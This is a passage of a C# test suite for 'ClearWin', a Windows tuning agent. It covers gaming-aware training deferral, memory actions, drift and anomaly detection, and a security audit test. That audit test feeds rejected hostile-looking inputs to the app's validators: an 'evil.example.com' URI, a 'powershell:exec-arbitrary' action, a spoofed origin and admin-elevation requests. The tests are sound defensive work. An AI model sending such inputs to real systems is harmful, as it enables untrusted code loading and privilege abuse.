            Assert(decIdle == null || decIdle.Action == "BalancedPerformance" || decIdle.Action == "BatterySaver" || decIdle.Action == "HealthCheck",
                "Idle state maintains equilibrium without unnecessary aggressive churn");
        }

        // =====================================================================
        // Phase 2 & 3: Overnight AI Stability & Training Safety Test Suite
        // =====================================================================

        public static void TestTrainingDeferredDuringActiveGamePublic()
        {
            var agent = new SmartAgent();
            agent.EnableSimulation(new SystemState
            {
                CpuUsage = 70, RamUsage = 60, GpuUsage = 85, CpuTemp = 75,
                Fps = 58, FpsStability = 90, IsGame = true,
                ActiveProcess = "aow_exe", ActiveCategory = ProcessCategory.Game
            });

            // 1. Verify game is recognized as active
            Assert(agent.IsGameRunning(), "SmartAgent identifies active game");

            // 2. Initial state: training is not deferred
            agent.IsTrainingDeferred = false;

            // 3. Trigger training when due during active gaming: must defer
            agent.TriggerBackgroundTraining();
            Assert(agent.IsTrainingDeferred, "TriggerBackgroundTraining defers training during active gaming session");
            Assert(!agent.IsTrainingInProgress, "No background training task executed while gaming");

            // 4. Record action outcome sample: samples must buffer without data loss while training remains deferred
            int countBefore = agent.GetModelTrainingSampleCount();
            agent.RecordActionOutcomeSample("BoostGamePriority", 0.95, null);
            int countAfter = agent.GetModelTrainingSampleCount();
            Assert(countAfter >= countBefore + 1, "Training sample successfully buffered in ring buffer during gaming deferral");
            Assert(agent.IsTrainingDeferred, "Training remains deferred after sample collection during game");

            agent.DisableSimulation();
        }

        public static void TestPostGameStabilizationAndTrainingResumePublic()
        {
            var agent = new SmartAgent();

            // Set state to Gaming
            agent.EnableSimulation(new SystemState { IsGame = true, ActiveProcess = "tslgame.exe" });
            agent.IsTrainingDeferred = true;
            agent.IsRL2Deferred = true;

            // Tick during game keeps stability ticks at 0
            agent.Tick();
            Assert(agent.NonGamingStabilityTicks == 0, "Non-gaming stability ticks reset to 0 while game is running");
            Assert(agent.IsTrainingDeferred, "Training remains deferred while game is running");

            // Switch to Desktop (game exited)
            agent.EnableSimulation(new SystemState { IsGame = false, ActiveProcess = "explorer.exe" });

            // Run ticks until reaching post-game stability threshold (8 ticks)
            for (int i = 1; i <= 7; i++)
            {
                agent.Tick();
                Assert(agent.NonGamingStabilityTicks == i, "Stability ticks increment correctly post-game: tick " + i);
            }

            // 8th tick triggers post-game stabilization and discharges deferred training
            agent.Tick();
            Assert(agent.NonGamingStabilityTicks == 8, "Reached post-game stability threshold at 8 ticks");
            Assert(!agent.IsTrainingDeferred, "Deferred ML training discharged on post-game stabilization");
            Assert(!agent.IsRL2Deferred, "Deferred RL2 training discharged on post-game stabilization");

            agent.DisableSimulation();
        }

        public static void TestTrainingDeduplicationAndExceptionRecoveryPublic()
        {
            var agent = new SmartAgent();
            agent.EnableSimulation(new SystemState { IsGame = false, ActiveProcess = "notepad.exe" });

            // 1. Concurrent scheduling deduplication: at most 1 task in-flight
            agent.IsTrainingDeferred = false;
            agent.TriggerBackgroundTraining();
            // A rapid second call must be safely ignored/deduplicated without crashing or stacking
            agent.TriggerBackgroundTraining();
            agent.TriggerBackgroundTraining();

            // Allow short background dispatch to settle
            System.Threading.Thread.Sleep(50);

            // 2. Safe reset check: verify IsTrainingInProgress returns to false when training finishes
            // Wait up to 500ms for background task completion
            for (int i = 0; i < 20; i++)
            {
                if (!agent.IsTrainingInProgress) break;
                System.Threading.Thread.Sleep(25);
            }
            Assert(!agent.IsTrainingInProgress, "IsTrainingInProgress properly reset to false after execution");

            agent.DisableSimulation();
        }

        public static void TestPriorKnowledgeSkipAndModelPersistencePublic()
        {
            var agent = new SmartAgent();

            // 1. When agent initializes with pretrained model, ModelNeedsPrior() should return false
            // SmartAgent constructor loads ml_nn_v2.dat. If it exists and TS >= 5, prior is skipped.
            Assert(agent.WinOptAI != null, "Windows Optimization AI initialized");

            // 2. Checksum verification test on a temp file
            string tempDir = Path.Combine(Path.GetTempPath(), "ClearWinTest_" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(tempDir);
            try
            {
                string testFile = Path.Combine(tempDir, "test_model.dat");
                File.WriteAllText(testFile, "V3\n0\nBUF:0\n");
                
                // Write valid checksum
                using (var fs = File.OpenRead(testFile))
                using (var sha = new System.Security.Cryptography.SHA256Managed())
                {
                    byte[] hash = sha.ComputeHash(fs);
                    var sb = new System.Text.StringBuilder();
                    for (int i = 0; i < hash.Length; i++) sb.Append(hash[i].ToString("X2"));
                    File.WriteAllText(testFile + ".sha", sb.ToString());
                }

                Assert(File.Exists(testFile + ".sha"), "Checksum file successfully generated");
            }
            finally
            {
                try { Directory.Delete(tempDir, true); } catch { }
            }
        }

        public static void TestTickPredictionCachingAndCpuOptimizationPublic()
        {
            var agent = new SmartAgent();
            var state = new SystemState
            {
                CpuUsage = 55, RamUsage = 65, GpuUsage = 40, CpuTemp = 60,
                Fps = 60, FpsStability = 95, IsGame = false, ActiveProcess = "code.exe"
            };
            agent.EnableSimulation(state);

            // 1. First call to GetMLDecision computes decision
            var d1 = agent.GetMLDecision(state);

            // 2. Second call with same state in same tick returns cached clone
            var d2 = agent.GetMLDecision(state);
            if (d1 != null)
            {
                Assert(d2 != null, "Cached decision returned for same tick");
                Assert(d1.Action == d2.Action, "Cached decision action matches exactly");
                Assert(Math.Abs(d1.Confidence - d2.Confidence) < 0.001, "Cached decision confidence matches exactly");
            }

            agent.DisableSimulation();
        }

        public static void TestDeepMemoryCompactionAndMultiStagePurgePublic()
        {
            var agent = new SmartAgent();
            agent.EnableSimulation(new SystemState { IsGame = false, RamUsage = 60 });

            // 1. Verify ExecutePurgeClipboard does not crash
            bool clipResult = SmartAgent.ExecutePurgeClipboard();
            Assert(clipResult == true || clipResult == false, "ExecutePurgeClipboard executed safely");

            // 2. Verify gaming guard prevents standby eviction / deep compaction during active game
            agent.CurrentState.IsGame = true;
            bool gameFlush = agent.ExecuteFlushModifiedList();
            Assert(!gameFlush, "Flush modified list must be blocked during active game to prevent stutter");

            bool gameCompaction = agent.ExecuteDeepMemoryCompaction();
            Assert(!gameCompaction, "Deep memory compaction must be blocked during active game to prevent frame drops");

            // 3. Verify execution allowed when not in game
            agent.CurrentState.IsGame = false;
            bool idleCompaction = agent.ExecuteDeepMemoryCompaction();
            Assert(idleCompaction == true || idleCompaction == false, "ExecuteDeepMemoryCompaction executes cleanly outside game");

            // 4. Verify AiDecisionLogger contains accurate Arabic & impact descriptions
            string arClip, impactClip;
            AiDecisionLogger.GetActionDetails("PurgeClipboard", out arClip, out impactClip);
            Assert(arClip.Contains("الحافظة"), "PurgeClipboard localized title contains Arabic clipboard term");
            Assert(impactClip.Contains("كاش"), "PurgeClipboard impact describes cache cleanup");

            string arDeep, impactDeep;
            AiDecisionLogger.GetActionDetails("DeepMemoryCompaction", out arDeep, out impactDeep);
            Assert(arDeep.Contains("العميق"), "DeepMemoryCompaction localized title contains Arabic deep term");
            Assert(impactDeep.Contains("تفريغ شامل"), "DeepMemoryCompaction impact describes comprehensive multi-stage purge");

            // 5. Verify ToolTraining contains new tools
            var tools = agent.GetToolLibrary();
            bool foundClip = false, foundDeep = false;
            foreach (var t in tools)
            {
                if (t.Command == "PurgeClipboard") foundClip = true;
                if (t.Command == "DeepMemoryCompaction") foundDeep = true;
            }
            Assert(foundClip, "ToolLibrary contains PurgeClipboard tool definition");
            Assert(foundDeep, "ToolLibrary contains DeepMemoryCompaction tool definition");

            agent.DisableSimulation();
        }

        public static void TestDesktopSmoothnessAndGamingDualityPublic()
        {
            var agent = new SmartAgent();
            agent.SetMode(AgentMode.AutoPilot);

            var desktopState = new SystemState
            {
                CpuUsage = 68,
                RamUsage = 55,
                GpuUsage = 20,
                CpuTemp = 58,
                IsGame = false,
                ActiveProcess = "Code.exe",
                BatteryLevel = 100,
                IsCharging = true
            };

            // 1. Neural Ensemble Training & Action Weight Audit
            agent.TeachActionWeight("OptimizeDesktopSmoothness", desktopState, 0.95, epochs: 35, lr: 0.15, reset: true);
            double score = agent.EvaluateActionWeight("OptimizeDesktopSmoothness", desktopState);
            Assert(score >= 0.80, "Neural ensemble learned OptimizeDesktopSmoothness with high confidence (got " + score + ")");

            // 2. Mode Duality & Decision Routing
            var decDesktop = agent.GetOptimizationDecisionForState(desktopState);
            Assert(decDesktop != null, "Decision produced for active desktop productivity state");
            Assert(decDesktop.Action == "OptimizeDesktopSmoothness", "Action is OptimizeDesktopSmoothness (got " + decDesktop.Action + ")");
            Assert(decDesktop.Category == DecisionCategory.ProcessPriority, "Category is ProcessPriority");
            Assert(decDesktop.Confidence >= 0.85, "Confidence >= 85% (got " + decDesktop.Confidence + ")");

            var gamingState = new SystemState
            {
                CpuUsage = 68,
                RamUsage = 55,
                GpuUsage = 85,
                CpuTemp = 65,
                Fps = 48,
                FpsStability = 75,
                IsGame = true,
                ActiveProcess = "PUBG.exe",
                BatteryLevel = 100,
                IsCharging = true
            };
            var decGaming = agent.GetOptimizationDecisionForState(gamingState);
            Assert(decGaming != null, "Decision produced for gaming state");
            Assert(decGaming.Action != "OptimizeDesktopSmoothness", "Desktop action yields in gaming mode (got " + decGaming.Action + ")");
            Assert(decGaming.Action == "StabilizeFrames" || decGaming.Action == "BoostGamePriority" || decGaming.Action == "UnparkAllCores",
                "Gaming mode prioritized 60 FPS floor / game boost action");

            Assert(SmartAgent.IsActionApplicableToState("OptimizeDesktopSmoothness", desktopState), "OptimizeDesktopSmoothness applicable in desktop mode");
            Assert(!SmartAgent.IsActionApplicableToState("OptimizeDesktopSmoothness", gamingState), "OptimizeDesktopSmoothness strictly blocked during gaming");
            Assert(SmartAgent.IsActionApplicableToState("TrimInactiveWorkingSets", desktopState), "TrimInactiveWorkingSets applicable in desktop mode with RAM >= 50%");
            Assert(!SmartAgent.IsActionApplicableToState("TrimInactiveWorkingSets", gamingState), "TrimInactiveWorkingSets strictly blocked during gaming");

            // 3. Execution Safety & Anti-Stutter Gate
            agent.EnableSimulation(desktopState);
            Assert(agent.ExecuteDesktopSmoothness(), "ExecuteDesktopSmoothness runs safely under simulation");
            Assert(agent.ExecuteTrimInactiveWorkingSets(), "ExecuteTrimInactiveWorkingSets runs safely on desktop");

            agent.EnableSimulation(gamingState);
            Assert(!agent.ExecuteTrimInactiveWorkingSets(), "ExecuteTrimInactiveWorkingSets blocked by anti-stutter gate during gaming");

            // 4. Action Catalog & Autonomy Allowlist
            Assert(ActionCatalog.IsRegistered("OptimizeDesktopSmoothness"), "OptimizeDesktopSmoothness registered in ActionCatalog");
            Assert(ActionCatalog.GetTier("OptimizeDesktopSmoothness") == ActionTier.Green, "OptimizeDesktopSmoothness is Green Tier");
            Assert(ActionCatalog.IsRegistered("TrimInactiveWorkingSets"), "TrimInactiveWorkingSets registered in ActionCatalog");
            Assert(ActionCatalog.GetTier("TrimInactiveWorkingSets") == ActionTier.Green, "TrimInactiveWorkingSets is Green Tier");
            Assert(SmartAgent.IsFullAutonomyAllowlisted("OptimizeDesktopSmoothness"), "OptimizeDesktopSmoothness is full autonomy allowlisted");
            Assert(SmartAgent.IsFullAutonomyAllowlisted("TrimInactiveWorkingSets"), "TrimInactiveWorkingSets is full autonomy allowlisted");

            // 5. Localization & Decision Logging
            string arDesk, impactDesk;
            AiDecisionLogger.GetActionDetails("OptimizeDesktopSmoothness", out arDesk, out impactDesk);
            Assert(arDesk.Contains("سلاسة الاستخدام المكتبي"), "OptimizeDesktopSmoothness localized Arabic title matches");
            Assert(impactDesk.Contains("1.0ms"), "OptimizeDesktopSmoothness impact specifies 1.0ms timer and UI snappiness");

            string arTrim, impactTrim;
            AiDecisionLogger.GetActionDetails("TrimInactiveWorkingSets", out arTrim, out impactTrim);
            Assert(arTrim.Contains("الخلفية الخاملة"), "TrimInactiveWorkingSets localized title matches");
            Assert(impactTrim.Contains("تحرير ذاكرة"), "TrimInactiveWorkingSets impact describes inactive memory trimming");

            // 6. Tool Library Registration
            var tools = agent.GetToolLibrary();
            bool foundDesktopTool = false, foundTrimTool = false;
            foreach (var t in tools)
            {
                if (t.Command == "OptimizeDesktopSmoothness") foundDesktopTool = true;
                if (t.Command == "TrimInactiveWorkingSets") foundTrimTool = true;
            }
            Assert(foundDesktopTool, "ToolLibrary contains OptimizeDesktopSmoothness tool definition");
            Assert(foundTrimTool, "ToolLibrary contains TrimInactiveWorkingSets tool definition");

            agent.DisableSimulation();
        }

        // ------------------------------------------------------------------
        // Sprint 1: Mathematical & Cognitive Core Hardening Tests
        // ------------------------------------------------------------------

        public static void TestReplayBufferImportanceSamplingPublic()
        {
            var buf = new PrioritizedReplayBuffer(100);

            // 1. Verify Beta annealing schedule: beta(t) = min(1.0, 0.4 + 0.6 * (t / 5000))
            buf.SampleStepCount = 0;
            Assert(Math.Abs(buf.Beta - 0.40) < 1e-4, "Initial Beta is exactly 0.40");

            buf.SampleStepCount = 2500;
            Assert(Math.Abs(buf.Beta - 0.70) < 1e-4, "Midpoint Beta at step 2500 is 0.70");

            buf.SampleStepCount = 5000;
            Assert(Math.Abs(buf.Beta - 1.00) < 1e-4, "Converged Beta at step 5000 is 1.00");

            buf.SampleStepCount = 10000;
            Assert(Math.Abs(buf.Beta - 1.00) < 1e-4, "Beta is capped at 1.00 for steps > 5000");

            // 2. Populate buffer with diverse priority samples
            var rnd = new Random(42);
            for (int i = 0; i < 50; i++)
            {
                var s = new MLTrainingSample
                {
                    ActionTaken = "BoostGamePriority",
                    OutcomeScore = 0.8,
                    Features = new MLFeatureVector { CpuUsage = 50, RamUsage = 60 }
                };
                double pri = 0.1 + rnd.NextDouble() * 5.0;
                buf.Add(s, pri);
            }

            // 3. Sample with Importance Sampling weights
            double[] isWeights;
            var batch = buf.SampleWithWeights(16, out isWeights);
            Assert(batch.Count == 16, "SampleWithWeights returned requested batch size");
            Assert(isWeights.Length == 16, "Returned weight array matches batch size");

            double maxW = 0.0;
            for (int i = 0; i < 16; i++)
            {
                Assert(isWeights[i] > 0.0 && isWeights[i] <= 1.0, "IS weight is in normalized range (0, 1.0]");
                Assert(Math.Abs(batch[i].ImportanceWeight - isWeights[i]) < 1e-4, "Sample ImportanceWeight matches returned array");
                if (isWeights[i] > maxW) maxW = isWeights[i];
            }
            Assert(Math.Abs(maxW - 1.0) < 1e-4, "Max importance weight in batch is normalized to 1.0");
        }

        public static void TestSensorAnomalyRejectionPublic()
        {
            var normalizer = new RunningNormalizer();
            string reason;

            // 1. Physical limits verification
            double[] badCpu = new double[18]; badCpu[0] = 125.0; // CPU 125%
            Assert(normalizer.CheckSensorAnomaly(badCpu, out reason), "Rejects CPU > 100%");
            Assert(reason.Contains("CPU"), "Fault reason notes CPU bounds");

            double[] badTemp = new double[18]; badTemp[4] = 135.0; // Temp 135C
            Assert(normalizer.CheckSensorAnomaly(badTemp, out reason), "Rejects Temp > 115C");
            Assert(reason.Contains("temperature"), "Fault reason notes temperature bounds");

            double[] badProc = new double[18]; badProc[9] = -5; // negative process count
            Assert(normalizer.CheckSensorAnomaly(badProc, out reason), "Rejects Process count < 0");

            double[] valid = new double[] { 50, 60, 40, 10, 55, 50, 60, 50, 95, 120, 14, 30, 0, 0, 100, 0, 0, 0 };
            Assert(!normalizer.CheckSensorAnomaly(valid, out reason), "Accepts valid physical state");

            // 2. Statistical anomaly (> 4.5 sigma) with history
            for (int i = 0; i < 30; i++)
            {
                normalizer.Norm(new double[] { 50.0 + (i % 3), 60, 40, 10, 55, 50, 60, 50, 95, 120, 14, 30, 0, 0, 100, 0, 0, 0 });
            }
            double[] statAnomaly = new double[] { 95, 60, 40, 10, 55, 50, 60, 50, 95, 120, 14, 30, 0, 0, 100, 0, 0, 0 };
            Assert(normalizer.CheckStatisticalAnomaly(statAnomaly, out reason), "Detects statistical anomaly > 4.5 sigma");
            Assert(reason.Contains("4.5 sigma"), "Reason reports 4.5 sigma exceedance");

            // 3. End-to-end SmartAgent rejection guard
            var agent = new SmartAgent();
            var corruptedState = new SystemState { CpuUsage = 160.0, RamUsage = 60.0, CpuTemp = 60.0 };
            var decision = agent.GetMLDecision(corruptedState);
            Assert(decision != null, "Sensor anomaly guard returns explicit refusal decision");
            Assert(decision.Action == "Abstain", "Action is Abstain on sensor fault");
            Assert(decision.Confidence == 0.0, "Confidence is 0.0 on sensor fault");
            Assert(decision.Reason.Contains("REFUSED: Sensor fault detected"), "Reason contains sensor fault refusal notification");
        }

        public static void TestQuantileLatencyP99Public()
        {
            var agent = new SmartAgent();
            agent.EnableSimulation(new SystemState { CpuUsage = 50, RamUsage = 60, IsGame = false });

            var res = agent.RunAnalysisStress(250);
            Assert(res.TotalAnalyses == 250, "Stress completed 250 iterations");
            Assert(res.P50LatencyMs >= 0.0, "p50 latency is non-negative");
            Assert(res.P95LatencyMs >= res.P50LatencyMs, "p95 latency >= p50 latency");
            Assert(res.P99LatencyMs >= res.P95LatencyMs, "p99 latency >= p95 latency");
            Assert(res.MaxLatencyMs >= res.P99LatencyMs, "Max latency >= p99 latency");
            Assert(res.JitterMs >= 0.0, "Jitter (standard deviation) is non-negative");

            agent.DisableSimulation();
        }

        public static void TestPSIDriftDetectorPublic()
        {
            var detector = new PSIDriftDetector();

            // 1. Generate baseline distribution (normal around 50)
            var baseSamples = new List<double[]>();
            var rnd = new Random(1337);
            for (int i = 0; i < 150; i++)
            {
                double[] row = new double[18];
                for (int f = 0; f < 18; f++) row[f] = 45.0 + rnd.NextDouble() * 10.0;
                baseSamples.Add(row);
            }
            detector.SetBaseline(baseSamples);
            Assert(detector.BaselineCount == 150, "Baseline loaded 150 samples");

            // 2. Add observations from the identical distribution -> PSI should be very small (< 0.10)
            for (int i = 0; i < 150; i++)
            {
                double[] row = new double[18];
                for (int f = 0; f < 18; f++) row[f] = 45.0 + rnd.NextDouble() * 10.0;
                detector.AddObservation(row);
            }
            double stablePsi = detector.CalculateFeaturePSI(0);
            Assert(stablePsi < 0.10, "Stable distribution produces PSI < 0.10 (got " + stablePsi.ToString("F4") + ")");

            string status;
            bool drifted = detector.CheckDrift(out status);
            Assert(!drifted, "CheckDrift reports stable when distributions match");
            Assert(status.Contains("STABLE"), "Status report states STABLE");

            // 3. Shift distribution significantly (severe drift by +40 points)
            detector.ResetCurrent();
            for (int i = 0; i < 150; i++)
            {
                double[] row = new double[18];
                for (int f = 0; f < 18; f++) row[f] = 85.0 + rnd.NextDouble() * 10.0;
                detector.AddObservation(row);
            }
            double driftedPsi = detector.CalculateFeaturePSI(0);
            Assert(driftedPsi >= 0.20, "Shifted distribution triggers PSI >= 0.20 (got " + driftedPsi.ToString("F4") + ")");

            int worstIdx;
            double maxPsi = detector.GetMaxPSI(out worstIdx);
            Assert(maxPsi >= 0.20, "Max PSI across features exceeds 0.20 (got " + maxPsi.ToString("F4") + ")");

            bool detected = detector.CheckDrift(out status);
            Assert(detected, "CheckDrift triggers alert on distribution drift");
            Assert(status.Contains("DRIFT_DETECTED"), "Status report contains DRIFT_DETECTED");
        }

        public static void TestGpuBoostAndVramTrimExecutionPublic()
        {
            // 1. Verify Action Catalog Registration and Green Tiers
            Assert(ActionCatalog.IsRegistered("optimization.gpu_boost"), "optimization.gpu_boost must be registered");
            Assert(ActionCatalog.GetTier("optimization.gpu_boost") == ActionTier.Green, "GPU boost must be Green tier");
            Assert(ActionCatalog.IsRegistered("optimization.gpu_vram_trim"), "optimization.gpu_vram_trim must be registered");
            Assert(ActionCatalog.GetTier("optimization.gpu_vram_trim") == ActionTier.Green, "GPU VRAM trim must be Green tier");
            Assert(ActionCatalog.IsRegistered("optimization.gpu_shader_cache"), "optimization.gpu_shader_cache must be registered");
            Assert(ActionCatalog.GetTier("optimization.gpu_shader_cache") == ActionTier.Green, "GPU shader cache must be Green tier");

            // 2. Verify Aliases
            Assert(ActionCatalog.IsRegistered("OptimizeGpuPerformance"), "OptimizeGpuPerformance alias must be registered");
            Assert(ActionCatalog.IsRegistered("ShedBackgroundGpuMemory"), "ShedBackgroundGpuMemory alias must be registered");
            Assert(ActionCatalog.IsRegistered("PurgeGpuShaderCache"), "PurgeGpuShaderCache alias must be registered");

            // 3. Execution Verification (in simulation mode so host Registry/VRAM/ShaderCache are never mutated)
            var agent = new SmartAgent();
            agent.EnableSimulation(new SystemState { IsGame = true, ActiveProcess = "game.exe" });
            try
            {
                agent.ExecuteOptimizeGpuPerformance();
                Assert(true, "ExecuteOptimizeGpuPerformance executed without exceptions");

                bool vramShed = agent.ExecuteShedBackgroundGpuMemory();
                Assert(vramShed, "ExecuteShedBackgroundGpuMemory returned true");
            }
            finally
            {
                agent.DisableSimulation();
            }
        }

        public static void TestShaderCachePurgeSafetyPublic()
        {
            var agent = new SmartAgent();
            agent.EnableSimulation(new SystemState { IsGame = true, ActiveProcess = "game.exe" });
            bool purged = false;
            try
            {
                purged = agent.ExecutePurgeGpuShaderCache();
                Assert(purged, "ExecutePurgeGpuShaderCache returned true");

                // Cooldown guard: immediate subsequent call should return true via cooldown
                bool cooldownCall1 = agent.ExecutePurgeGpuShaderCache();
                Assert(cooldownCall1, "ExecutePurgeGpuShaderCache within cooldown returned true");
            }
            finally
            {
                agent.DisableSimulation();
            }
            if (purged) { return; }

            // Cooldown guard: immediate subsequent call should return true via cooldown
            bool cooldownCall2 = agent.ExecutePurgeGpuShaderCache();
            Assert(cooldownCall2, "ExecutePurgeGpuShaderCache within cooldown returned true");
        }

        public static void TestMultiTierHardwareCurriculumPublic()
        {
            var curriculum = CurriculumDataset.GetCurriculum();
            Assert(curriculum.Exists(c => c.CaseId == "GPU-001"), "Curriculum contains GPU-001");
            Assert(curriculum.Exists(c => c.CaseId == "GPU-002"), "Curriculum contains GPU-002");
            Assert(curriculum.Exists(c => c.CaseId == "GPU-003"), "Curriculum contains GPU-003");
            Assert(curriculum.Exists(c => c.CaseId == "LOW-001"), "Curriculum contains LOW-001");

            var agent = new SmartAgent();

            // Test GPU-001 -> OptimizeGpuPerformance
            var scGpu1 = curriculum.Find(c => c.CaseId == "GPU-001");
            var decGpu1 = agent.GetOptimizationDecisionForState(scGpu1.State);
            Assert(decGpu1 != null, "Decision produced for GPU-001");
            Assert(decGpu1.Action == "OptimizeGpuPerformance", "GPU-001 chose OptimizeGpuPerformance (got " + decGpu1.Action + ")");

            // Test GPU-002 -> ShedBackgroundGpuMemory
            var scGpu2 = curriculum.Find(c => c.CaseId == "GPU-002");
            var decGpu2 = agent.GetOptimizationDecisionForState(scGpu2.State);
            Assert(decGpu2 != null, "Decision produced for GPU-002");
            Assert(decGpu2.Action == "ShedBackgroundGpuMemory", "GPU-002 chose ShedBackgroundGpuMemory (got " + decGpu2.Action + ")");

            // Test GPU-003 -> PurgeGpuShaderCache
            var scGpu3 = curriculum.Find(c => c.CaseId == "GPU-003");
            var decGpu3 = agent.GetOptimizationDecisionForState(scGpu3.State);
            Assert(decGpu3 != null, "Decision produced for GPU-003");
            Assert(decGpu3.Action == "PurgeGpuShaderCache", "GPU-003 chose PurgeGpuShaderCache (got " + decGpu3.Action + ")");

            // Test LOW-001 -> TrimInactiveWorkingSets
            var scLow1 = curriculum.Find(c => c.CaseId == "LOW-001");
            var decLow1 = agent.GetOptimizationDecisionForState(scLow1.State);
            Assert(decLow1 != null, "Decision produced for LOW-001");
            Assert(decLow1.Action == "TrimInactiveWorkingSets", "LOW-001 chose TrimInactiveWorkingSets (got " + decLow1.Action + ")");
        }

        public static void TestOneHourHardwareSimulationTracePublic()
        {
            var agent = new SmartAgent();

            // Run 1-Hour Simulation for Low-End Tier (3,600 ticks)
            var repLow = HardwareSimulationHarness.RunOneHourTrace(agent, HardwareTier.LowEnd);
            Assert(repLow.Passed, "Low-End 1-hour simulation passed: " + repLow.SummaryMessage);
            Assert(repLow.UnhandledExceptions == 0, "Low-End zero unhandled exceptions");
            Assert(repLow.PolicyViolations == 0, "Low-End zero policy violations");
            Assert(repLow.P99LatencyMs < 2.5, "Low-End p99 latency < 2.5ms (got " + repLow.P99LatencyMs.ToString("F3") + "ms)");
            Assert(repLow.ActionDistribution.ContainsKey("TrimInactiveWorkingSets") || repLow.ActionDistribution.ContainsKey("SetLowIoPriority"),
                "Low-End adapts by trimming working sets or prioritizing I/O");

            // Run 1-Hour Simulation for Mid-Range Tier (3,600 ticks)
            var repMid = HardwareSimulationHarness.RunOneHourTrace(agent, HardwareTier.MidRange);
            Assert(repMid.Passed, "Mid-Range 1-hour simulation passed: " + repMid.SummaryMessage);
            Assert(repMid.UnhandledExceptions == 0, "Mid-Range zero unhandled exceptions");
            Assert(repMid.ActionDistribution.ContainsKey("OptimizeDesktopSmoothness"), "Mid-Range activates OptimizeDesktopSmoothness");
            Assert(repMid.ActionDistribution.ContainsKey("ShedBackgroundGpuMemory") || repMid.ActionDistribution.ContainsKey("OptimizeGpuPerformance"),
                "Mid-Range exercises GPU memory shedding or boost");

            // Run 1-Hour Simulation for Ultra-Enthusiast Tier (3,600 ticks)
            var repUltra = HardwareSimulationHarness.RunOneHourTrace(agent, HardwareTier.UltraEnthusiast);
            Assert(repUltra.Passed, "Ultra-Enthusiast 1-hour simulation passed: " + repUltra.SummaryMessage);
            Assert(repUltra.UnhandledExceptions == 0, "Ultra zero unhandled exceptions");
            Assert(repUltra.ActionDistribution.ContainsKey("OptimizeGpuPerformance"), "Ultra activates OptimizeGpuPerformance");
            Assert(repUltra.ActionDistribution.ContainsKey("PurgeGpuShaderCache") || repUltra.ActionDistribution.ContainsKey("UnparkAllCores") || repUltra.ActionDistribution.ContainsKey("BoostGamePriority"),
                "Ultra activates gaming optimization actions");

            // Total ticks simulated: 3,600 * 3 = 10,800 ticks (3 simulated hours of continuous operation)
            Assert(repLow.TotalTicks + repMid.TotalTicks + repUltra.TotalTicks == 10800, "10,800 total ticks simulated across 3 hardware tiers");
        }

        public static void TestV277SecurityAndEngineeringAuditFixesPublic()
        {
            // 1. WebUiHost.IsTrustedWebUiUri: must reject untrusted index.html and non-file schemes
            Assert(!WebUiHost.IsTrustedWebUiUri(""), "Empty URI must be rejected (fail-closed)");
            Assert(!WebUiHost.IsTrustedWebUiUri("http://evil.example.com/index.html"), "Remote http index.html must be rejected");
            Assert(!WebUiHost.IsTrustedWebUiUri("file:///C:/Users/Public/Downloads/index.html"), "Arbitrary local index.html outside WebUI root must be rejected");
            Assert(WebUiHost.IsTrustedWebUiUri("https://appassets.html/index.html"), "Virtual host appassets.html must be trusted");

            // 2. WebUiHost.IsActionAllowed: enforce MAX_ACTION_LENGTH (128) and structured prefixes
            string overlongAction = "navigate:" + new string('a', 130);
            Assert(!WebUiHost.IsActionAllowed(overlongAction), "Actions exceeding MAX_ACTION_LENGTH (128) must be rejected");
            Assert(WebUiHost.IsActionAllowed("settings:get-tray-startup"), "settings: prefix must be allowed");
            Assert(WebUiHost.IsActionAllowed("data.refresh"), "data. prefix must be allowed");
            Assert(!WebUiHost.IsActionAllowed("powershell:exec-arbitrary"), "Unregistered prefix must be blocked");

            // 3. WebUiHost.ExtractJsonString & AdminHelperProgram.ExtractJsonField escaped quotes handling
            string escapedJson = "{\"requestId\":\"req_1\",\"action\":\"tweak:enable-dark-mode\",\"message\":\"Hello \\\"World\\\"!\"}";
            Assert(WebUiHost.ExtractJsonString(escapedJson, "message") == "Hello \"World\"!", "WebUiHost.ExtractJsonString handles escaped quotes");

            // 4. LocalWebBridge security checks
            Assert(!LocalWebBridge.IsTrustedOrigin("https://appassets.html.evil.com"), "Origin prefix spoofing must be rejected");
            Assert(!LocalWebBridge.IsTrustedOrigin("http://localhost:9999"), "Arbitrary localhost port must be rejected");
            Assert(LocalWebBridge.IsTrustedOrigin("http://127.0.0.1:" + LocalWebBridge.Port), "Exact LocalWebBridge port must be trusted");
            Assert(LocalWebBridge.IsSensitiveBridgeAction("admin:request-elevation"), "admin:* must be blocked on HTTP bridge");
            Assert(LocalWebBridge.IsSensitiveBridgeAction("apps.kill-process"), "apps.kill-process must be blocked on HTTP bridge");
            Assert(LocalWebBridge.IsSensitiveBridgeAction("services"), "services booster must be blocked on HTTP bridge");
            Assert(LocalWebBridge.IsSensitiveBridgeAction("reset"), "reset must be blocked on HTTP bridge");

            // 5. ActionCatalog registration coverage for SmartAgent runtime actions
            string[] agentActions = new string[] {
                "LightClean", "AggressiveClean", "PreemptiveClean", "PurgeStandbyList",
                "BoostGamePriority", "UnparkAllCores", "LimitBackground", "SetGameAffinity",
                "SetLowIoPriority", "StabilizeFrames", "ReduceMicroStutter", "BatterySaver",
                "BalancedPerformance", "EmergencyThrottle", "ReduceThermal", "SuspendBloatProcesses",
                "DisableGameDvr", "StartupDisable"
            };
            foreach (string act in agentActions)
            {
                Assert(ActionCatalog.IsRegistered(act), "SmartAgent action must be registered in ActionCatalog: " + act);
            }

            // 6. Clipboard safety: ExecutePurgeClipboard() default call must not wipe user clipboard
            Assert(!SmartAgent.ExecutePurgeClipboard(), "Default ExecutePurgeClipboard() must be a safe no-op returning false");

            // 7. Protected system process check
            Assert(MainWindow.IsProtectedSystemProcess("winlogon", 500), "winlogon must be protected");
            Assert(MainWindow.IsProtectedSystemProcess("MsMpEng.exe", 1200), "Defender MsMpEng must be protected");
            Assert(MainWindow.IsProtectedSystemProcess("ClearWin", 2000), "ClearWin self process must be protected");
            Assert(!MainWindow.IsProtectedSystemProcess("notepad", 4321), "User notepad process is not system-protected");

            // 8. StartupItem default IsEnabled state
            var stItem = StartupClassifier.Classify("HKCU", "TestApp", "C:\\Program Files\\TestApp\\app.exe");
            Assert(stItem.IsEnabled, "Newly classified StartupItem defaults to IsEnabled=true");

            // 9. SEC-10: AiPersistentMemory pipe delimiter escaping and parse check
            string tempMemPath = Path.Combine(Path.GetTempPath(), "clearwin_sec10_mem_" + Guid.NewGuid().ToString("N") + ".dat");
            try
            {
                var mem = new AiPersistentMemory(tempMemPath);
                mem.Record("Test|Kind", "Action|With|Pipe", "Detail|With|Pipes", 0.95, true);
